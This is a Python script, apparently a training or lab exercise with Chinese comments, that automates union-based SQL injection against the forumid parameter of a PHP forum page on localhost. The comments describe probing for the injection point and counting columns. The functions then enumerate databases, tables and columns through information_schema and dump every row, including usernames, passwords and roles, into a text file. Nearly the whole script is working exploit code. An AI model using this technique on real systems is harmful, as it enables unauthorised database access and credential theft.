import re
import requests


# 0、and 1=1 与 and 1=2 || '#  来试探是否有注入点，order by 5 找列数，?forumid=-1 union select 1,2,3,4,5 union联合查询的前提：列数相等（将主查询改为负数）
# 1、在火狐中用union_based下的databases，tables，依次获取库名，表名
# 2、用(select group_concat(column_name) from information_schema.columns where table_schema='zzz' and table_name='user')获取列名
# 3、用(select concat_ws('--', username,password,role) as userinfo from zzz.user limit 0,1)获取数据 limit 0，1 索引从0开始，每次一条数据
# 4、用正则匹配然后保存

def get_databases():
    url = 'http://localhost/forum/html/forum_lookup_html.php?forumid=-1 union select 1,(SELECT+GROUP_CONCAT(schema_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.SCHEMATA),3,4,5'
    s = requests.get(url)
    regular = "white;'>(.+?)</div"
    res = re.findall(regular, s.text)
    databases = str(res[0]).split('<br>')
    return databases  # ['information_schema', 'mysql', 'performance_schema', 'sakila', 'sys', 'world', 'zzz']


def get_tables():
    url = f"http://localhost/forum/html/forum_lookup_html.php?forumid=-1 union select 1,(SELECT group_concat(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA = 'zzz'),3,4,5"
    s = requests.get(url)
    regular = "white;'>(.+?)</div"
    res = re.findall(regular, s.text)
    tables = str(res[0]).split(',')
    return tables  # ['dboption', 'forum', 'py_welcome', 'py_welcome_log', 'student', 'user', 'user_old']


def get_column():
    all_column = {}
    tables = get_tables()
    for t in tables:
        url = f"http://localhost/forum/html/forum_lookup_html.php?forumid=-1 union select 1,(SELECT group_concat(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = 'zzz' AND TABLE_NAME = '{t}'),3,4,5"
        s = requests.get(url)
        regular = "white;'>(.+?)</div"
        res = re.findall(regular, s.text)
        all_column[t] = res[0]
    return all_column  # {'dboption': 'id,name', 'forum': 'forumid,headline,content,username,createtime', 'py_welcome': 'username,password,phone,balance', 'py_welcome_log': 'username,event,time', 'student': 'studentid,sname,age,degree,sex,phone,classid,createtime', 'user': 'userid,username,password,role,phone,imgs,createtime,count,lasttime', 'user_old': 'userid,username,password,role,phone,imgs,createtime'}


def do_torco():
    i = 0
    while True:
        url = f"http://localhost/forum/html/forum_lookup_html.php?forumid=-1%20union%20select%201,%20(select%20concat_ws(%27--%27,%20username,password,role)%20as%20userinfo%20from%20zzz.user%20limit%20{i},1)%20,3,4,5"
        s = requests.get(url)
        regular = "white;'>(.+?)</div"
        info = re.findall(regular, s.text)
        if "</div><br><div style='color: white;'>作者：4" not in info[0]:
            i += 1
            print(info[0])
            with open('../temp/torco.txt', mode='a') as file:
                file.write(f"{info[0]}\n")
        else:
            exit()


def do_torco_v1():
    column = get_column()
    for k, v in column.items():
        rows = f"http://localhost/forum/html/forum_lookup_html.php?forumid=-1 union select 1,(select concat(count(*)) from zzz.{k}),3,4,5"
        regular = "white;'>(.+?)</div"
        rows_num = (re.findall(regular, requests.get(rows).text)[0])  # 6,5,3,18,150,2,2
        for r in range(int(rows_num)):
            url = f"http://localhost/forum/html/forum_lookup_html.php?forumid=-1 union select 1,(select concat_ws('--',{v}) from zzz.{k} limit {r},1),3,4,5"
            s = requests.get(url)
            regular = "white;'>(.+?)</div"
            res = re.findall(regular, s.text)
            print(res[0])


if __name__ == '__main__':
    # print(get_databases())
    # print(get_tables())
    # print(get_column())
    # do_torco()
    do_torco_v1()
